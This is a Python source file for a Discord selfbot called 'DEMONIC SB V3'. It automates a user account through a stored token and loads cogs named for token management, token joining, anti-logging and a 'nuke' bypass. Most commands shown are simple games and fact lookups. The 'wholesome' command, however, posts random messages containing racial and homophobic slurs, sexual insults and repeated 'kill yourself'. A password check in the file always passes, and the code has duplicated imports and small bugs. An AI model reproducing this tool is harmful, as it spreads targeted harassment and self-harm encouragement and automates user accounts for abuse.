import discord
import time
import random
import os
import json
import websockets
import io
import threading
from datetime import datetime
from alw import ALWHandler
running_processes = {}
from discord.client import aiohttp
import asyncio
import subprocess
import requests
from discord.ext import commands
from datetime import datetime
from discord.ext import commands
from colorama import Fore
from io import BytesIO
from colorama import Fore
from pystyle import *
import ctypes
from datetime import datetime
import subprocess
import threading
import random
import string
import os
import asyncio
from colorama import Fore, Style
from itertools import cycle
import subprocess
from plyer import notification
import discord
from discord.ext import commands
import os
import json
import random
import string
import aiohttp
import sys
import asyncio
import base64
from colorama import Fore
from pystyle import *
import ctypes
from datetime import datetime
import subprocess
import threading
import random
import string
import os
import asyncio
from colorama import Fore, Style
from itertools import cycle
import subprocess
import time
import glob
import shutil
import soundfile as sf
import numpy as np
from pypresence import Presence
import random
from collections import defaultdict








alw_handler = None
# Load jokes from a file
def load_jokes():
    with open("jokes.txt", "r") as file:
        return [line.strip() for line in file.readlines()]

# Discord bot setup
intents = discord.Intents.default()
intents.members = True
intents.messages = True
intents.guilds = True
intents.dm_messages = True
intents.guild_messages = True
status_rotation_active = False
emoji_rotation_active = False
current_status = ""
current_emoji = ""
dreact_users = {}
autoreact_users = {}
sniper_enabled = {}
auto_reply_target_id = None
auto_reply_message = None
intents = discord.Intents.default()
intents.messages = True
intents.dm_messages = True



prefix = "."

# Define a function to get the current prefix
def get_prefix(bot, message):
    return prefix

# Set up the bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix=get_prefix, self_bot=True, intents=intents, help_command= None)
black = "\033[30m"
red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
magenta = "\033[35m"
cyan = "\033[36m"
white = "\033[37m"
reset = "\033[0m"  
pink = "\033[38;2;255;192;203m"
white = "\033[37m"
blue = "\033[34m"
black = "\033[30m"
light_green = "\033[92m" 
light_yellow = "\033[93m" 
light_magenta = "\033[95m" 
light_cyan = "\033[96m"  
light_red = "\033[91m"  
light_blue = "\033[94m" 
www = Fore.WHITE
mkk = Fore.BLUE
b = Fore.BLACK
ggg = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX 
pps = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
qqq = Fore.MAGENTA
lbb = Fore.LIGHTBLUE_EX
mll = Fore.LIGHTBLUE_EX
mjj = Fore.RED
yyy = Fore.YELLOW




    
        

      

try:
    bot.load_extension('antilog')
    print(f"{Fore.GREEN}[SUCCESS] Antilog cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load antilog cog: {str(e)}")
    

try:
    bot.load_extension('token_manager')
    print(f"{Fore.GREEN}[SUCCESS] Token manager cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load token manager cog: {str(e)}")
    
try:
    bot.load_extension('event_react')
    print(f"{Fore.GREEN}[SUCCESS] Event react cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load event react cog: {str(e)}")
    
try:
    bot.load_extension('pingnoti')
    print(f"{Fore.GREEN}[SUCCESS]Ping noti cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load ping noti cog: {str(e)}")
    
try:
    bot.load_extension('window_stuff')
    print(f"{Fore.GREEN}[SUCCESS]Window Stuff cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load Window stuff cog: {str(e)}")

    

try:
    bot.load_extension('token_joiner')
    print(f"{Fore.GREEN}[SUCCESS]token joiner Cog Loaded successfully")
except Exception as e:
    print (f"{Fore.RED}[ERROR] Failed To Load tokenjoiner Cog: {str(c)}")    

try:
    bot.load_extension('rpc')
    print(f"{Fore.GREEN}[SUCCESS]RPC Cog Loaded successfully")
except Exception as e:
    print (f"{Fore.RED}[ERROR] Failed To Load rpc Cog: {str(c)}")  
    
    
try:
    bot.load_extension('server_protection')
    print(f"{Fore.GREEN}[SUCCESS] Server Protection cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load Server Protection cog: {str(e)}")

try:
    bot.load_extension('deco')
    print(f"{Fore.GREEN}[SUCCESS] Deco cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load Deco Cog: {str(e)}")

try:
    bot.load_extension('hosting')
    print(f"{Fore.GREEN}[SUCCESS] Hosting cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load Hosting Cog: {str(e)}")   
    
    
try:
    bot.load_extension('vanity')
    print(f"{Fore.GREEN}[SUCCESS] Vanity cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load Vanity Cog: {str(e)}")   
    
try:
    with open('config.json', 'r') as config_file:
        configsss = json.load(config_file)
        usertoken = configsss.get("token")
        NukeBypass = configsss.get("NukeServerBypass")
        if not usertoken:
            raise ValueError("Token not found in config.json.")
except FileNotFoundError:
    print("config.json file not found. Please create the file with your bot token.")
    sys.exit()
except ValueError as e:
    print(f"Error: {e}")
    sys.exit()
    
    







DISCORD_API_URL_SINGLE = "https://discord.com/api/v9/users/@me/settings"
single_status_rotation_task = None
single_status_list = []
single_status_delay = 3  # Default delay in seconds
# Command to change the prefix
@bot.command()
async def setprefix(ctx, new_prefix):
    global prefix
    if new_prefix.lower() == "none":
        prefix = ""  # Set prefix to nothing
        await ctx.send("Prefix removed. Commands can now be used without a prefix.")
    else:
        prefix = new_prefix
        await ctx.send(f"Prefix changed to: {new_prefix}")

ar3_targets = {}
ar1_targets = {}
ar2_targets = {} 
react_active = False
selfreact_active = False 
ugc_task = None 
  



# Store the bot's start time
start_time = time.time()

@bot.command()
async def ship(ctx, user1: discord.Member, user2: discord.Member):
    percentage = random.randint(0, 100)
    await ctx.send(f"{user1.mention} and {user2.mention} are {percentage}% compatible!")
    
    
# Add additional commands similarly...
# 1. !mock
@bot.command()
async def mock(ctx, *, text: str):
    mocked = ''.join(random.choice([char.upper(), char.lower()]) for char in text)
    await ctx.send(mocked)

def require_password():
    async def predicate(ctx):
            
        return True
    return commands.check(predicate)
# 2. !reverse
@bot.command()
async def reverse(ctx, *, text: str):
    await ctx.send(text[::-1])

# 3. !emojify
@bot.command()
async def emojify(ctx, *, text: str):
    emojified = ' '.join([f":regional_indicator_{char}:" if char.isalpha() else char for char in text.lower()])
    await ctx.send(emojified)


@bot.command(name="rps")
async def rps(ctx, choice: str):
    options = ["rock", "paper", "scissors"]
    bot_choice = random.choice(options)
    if choice.lower() not in options:
        await ctx.send("Please choose rock, paper, or scissors.")
        return
    if choice.lower() == bot_choice:
        await ctx.send(f"It's a tie! We both chose {bot_choice}.")
    elif (choice.lower() == "rock" and bot_choice == "scissors") or \
         (choice.lower() == "paper" and bot_choice == "rock") or \
         (choice.lower() == "scissors" and bot_choice == "paper"):
        await ctx.send(f"You win! I chose {bot_choice}.")
    else:
        await ctx.send(f"You lose! I chose {bot_choice}.")
        
bot.command(name="catfact")
async def catfact(ctx):
    response = requests.get("https://catfact.ninja/fact")
    data = response.json()
    await ctx.send(f"**Cat Fact:** {data['fact']}")

@bot.command(name="dogfact")
async def dogfact(ctx):
    response = requests.get("https://dog-api.kinduff.com/api/facts")
    data = response.json()
    await ctx.send(f"**Dog Fact:** {data['facts'][0]}")

@bot.command(name="dadjoke")
@require_password()
async def dadjoke(ctx):
    response = requests.get("https://icanhazdadjoke.com/", headers={"Accept": "application/json"})
    data = response.json()
    await ctx.send(f"**Dad Joke:** {data['joke']}")
    


# Helper functions
def fetch_random_gif(keyword):
    # Replace this with an actual API call to fetch GIFs (e.g., Tenor or Giphy)
    return f"Random GIF related to {keyword}!"

def get_random_activity():
    activities = [
        "Try painting something!",
        "Read a random Wikipedia article.",
        "Take a walk and enjoy nature.",
        "Write a short story about your day.",
        "Learn a new word in another language!"
    ]
    return random.choice(activities)

def get_random_advice():
    advice_list = [
        "Never stop learning, because life never stops teaching.",
        "Don't be afraid to fail; be afraid not to try.",
        "Always take time to appreciate the little things in life.",
    ]
    return random.choice(advice_list)

def get_random_riddle():
    riddles = {
        "What has keys but can't open locks?": "A piano.",
        "I speak without a mouth and hear without ears. I have no body, but I come alive with wind. What am I?": "An echo.",
        "What has to be broken before you can use it?": "An egg."
    }
    question, answer = random.choice(list(riddles.items()))
    return question, answer

# Commands


@bot.command()
@require_password()
async def choose(ctx, *options):
    if options:
        await ctx.send(f"I choose: {random.choice(options)}")
    else:
        await ctx.send("Please provide options to choose from.")

@bot.command()
@require_password()
async def advice(ctx):
    await ctx.send(get_random_advice())

@bot.command()
@require_password()
async def riddle(ctx):
    question, answer = get_random_riddle()
    await ctx.send(question)

    def check(m):
        return m.content.lower() == answer.lower() and m.channel == ctx.channel

    try:
        msg = await bot.wait_for('message', timeout=30.0, check=check)
        await ctx.send(f"Correct, {msg.author.mention}!")
    except:
        await ctx.send(f"Time's up! The correct answer was: {answer}")

@bot.command()
@require_password()
async def trivia(ctx):
    questions = {
        "What is the capital of France?": "Paris",
        "What is 2 + 2?": "4",
        "Who wrote 'Hamlet'?": "Shakespeare"
    }
    question, answer = random.choice(list(questions.items()))
    await ctx.send(question)

    def check(m):
        return m.content.lower() == answer.lower() and m.channel == ctx.channel

    try:
        msg = await bot.wait_for('message', timeout=30.0, check=check)
        await ctx.send(f"Correct, {msg.author.mention}!")
    except:
        await ctx.send(f"Time's up! The correct answer was: {answer}")

@bot.command()
@require_password()
async def dice(ctx):
    roll = random.randint(1, 6)
    await ctx.send(f"You rolled a {roll}!")

@bot.command()
@require_password()
async def coinflip(ctx):
    await ctx.send(f"The coin landed on {'heads' if random.choice([True, False]) else 'tails'}.")

# 11. !zodiacmatch
@bot.command()
@require_password()
async def zodiacmatch(ctx, sign1: str, sign2: str):
    compatibility = random.randint(0, 100)
    await ctx.send(f"The compatibility between {sign1} and {sign2} is {compatibility}%!")
    
    
# 14. !spellcheck
@bot.command()
@require_password()
async def spellcheck(ctx, word: str):
    if word.isalpha():
        await ctx.send(f"The word `{word}` is spelled correctly!")
    else:
        await ctx.send(f"`{word}` doesn't seem right.")

# 15. !hangman
@bot.command()
@require_password()
async def hangman(ctx):
    word = random.choice(["python", "discord", "hangman", "bot"])
    hidden = "_ " * len(word)
    await ctx.send(f"Let's play Hangman! The word is: {hidden.strip()}")

# 16. !spin
@bot.command()
@require_password()
async def spin(ctx):
    await ctx.send(f"The wheel spins... 🎡 And it lands on **{random.randint(1, 100)}**!")

# 17. !guessnumber
@bot.command()
@require_password()
async def guessnumber(ctx):
    number = random.randint(1, 50)
    await ctx.send("Guess a number between 1 and 50!")

    def check(m):
        return m.author == ctx.author and m.content.isdigit()

    try:
        guess = await bot.wait_for("message", check=check, timeout=30.0)
        if int(guess.content) == number:
            await ctx.send("You guessed it! 🎉")
        else:
            await ctx.send(f"Oops! The correct number was {number}.")
    except:
        await ctx.send(f"Time's up! The number was {number}.")

# 18. !animal
@bot.command()
@require_password()
async def animal(ctx, animal_type: str = None):
    animals = {
        "cat": "https://placekitten.com/200/300",
        "dog": "https://placedog.net/500",
        "fox": "https://randomfox.ca/floof/"
    }
    if animal_type in animals:
        await ctx.send(animals[animal_type])
    else:
        await ctx.send("I only have pictures of cats, dogs, and foxes!")

# 19. !coffee
@bot.command()
@require_password()
async def coffee(ctx):
    recipes = [
        "Espresso with steamed milk - Latte!",
        "Double espresso with water - Americano!",
        "Espresso with chocolate and milk - Mocha!"
    ]
    await ctx.send(f"How about this coffee? {random.choice(recipes)}")


@bot.command()
@require_password()
async def wholesome(ctx):
    messages = ["you looks so ass even your mom don't love you","you lifeless homeless bitchless nigga","you are a black ass nigga trying to be cool","suck my dick nigga","bitch I hoed you","you slut ass dickless kid","dork I'll kill you","my lost sperm","semen licker","you broke ass work at 9/11 and your mom sell herself 24/7 to pay your debt","bitchass","faggot","femboy","shit licker","dickhead nigga","brainrotted kid","I cooked you motherfucking ass","you pedophile ass trying to hit on kids","illiterate kid","you weak af nigga","I'll rip you off","I raped your whole bloodline","dick sucker","absurdly ugly lizard","you disgusting waste of oxygen","fuck off","jerk","your mom is such a whore I fucked her twice and she wants more","nigga you suck","you are weak as your dad's protection I'll rip your ass off you dumbass bitch","worthless and jobless dick","tired of failure pointless homeless faggot","sickening disgusting piece of rot","kill yourself","you disgusting pedophile piece of shit trying to comeback","dick rider","horny ass pedophile","corny ass jr","you suck crazy ass nigga silent dirty ass pedophile no one loves you","dim-witted old loser with a garbage face no one likes","you are a fucking creep and lifeless","clown ass kid","weak jr cuck you stinks","retarded hideous bitch","you mad ass hoe","dog shit eater","you are so ass nigga no one likes you","stinky ass","you are a dork ass bitch sucking everyone's dick","pathetic being you got no life purposes","even your mom lie to you when she say you are beautiful","dummy ass pissball","you are useless as shit kill yourself you ass"]
    await ctx.send(random.choice(messages))


# Utility Commands
@bot.command()
@require_password()
async def ping(ctx):
    current_time = time.time()
    uptime_seconds = int(current_time - start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime = f"{hours}h {minutes}m {seconds}s"

    latency = round(bot.latency * 1000)
    cached_messages = len(bot.cached_messages)
    cached_users = len(bot.users)
    servers = len(bot.guilds)

    message = (f"""```ansi
{magenta} 
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⣴⣿⣿⣿⣿⡿⠁⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣷⣿⣿⣿⣿⣿⠁⠀⠀⠀⢨⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣾⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⢀⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠋⠉⠉⠙⠛⠿⠟⠻⠿⠿⠿⠿⠷⣤⣀⠀⠀⢀⠴⠟⠛⠛⠛⠋⠉⠁⠉⠁⠀⠀⠀⠀⠀⠀⣼⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢰⣄⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣧⣀⣀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣿⣿⣸⣿⣿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⢸⣿⣦⣦⣄⡀⠀⢠⣶⢰⣦⣶⣰⣆⣶⣰⣦⣄⢰⣴⡄⣴⠀⠀⣦⣷⣿⣿⣿⣿⣯⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⡿⣿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⡿⠇⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⢹⠘⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⡟⢹⣿⣿⣿⣿⣿⣿⠹⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠟⠏⢿⢿⢿⢧⠘⣿⢿⣿⡟⠿⡇⠸⣿⠿⢻⡟⠛⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠘⠀⠀⠈⠈⠁⠀⠃⠀⠀⠀⠀⠃⠀⠀⠀

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
~ Bot Statistics
``````ansi\n

 {magenta}Latency: <{latency}ms>
 {cyan}Uptime: <{hours}h {minutes}m {seconds}s>
 {red}Cached Messages: <{cached_messages}>
 {yellow}Cached Users: <{cached_users}>
 {green}Servers: <{servers}>
``````ansi\n 
 {magenta}
       DEMONIC SB V3 (Dev)
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⣴⣿⣿⣿⣿⡿⠁⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣷⣿⣿⣿⣿⣿⠁⠀⠀⠀⢨⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣾⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⢀⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠋⠉⠉⠙⠛⠿⠟⠻⠿⠿⠿⠿⠷⣤⣀⠀⠀⢀⠴⠟⠛⠛⠛⠋⠉⠁⠉⠁⠀⠀⠀⠀⠀⠀⣼⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢰⣄⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣧⣀⣀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣿⣿⣸⣿⣿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⢸⣿⣦⣦⣄⡀⠀⢠⣶⢰⣦⣶⣰⣆⣶⣰⣦⣄⢰⣴⡄⣴⠀⠀⣦⣷⣿⣿⣿⣿⣯⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⡿⣿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⡿⠇⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⢹⠘⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⡟⢹⣿⣿⣿⣿⣿⣿⠹⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠟⠏⢿⢿⢿⢧⠘⣿⢿⣿⡟⠿⡇⠸⣿⠿⢻⡟⠛⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠘⠀⠀⠈⠈⠁⠀⠃⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


```""")
    await ctx.send(message)
    
    

    

# Dictionary to store user flood settings (user_id, server_id, None for DMs) -> message
auto_flood_users = {}

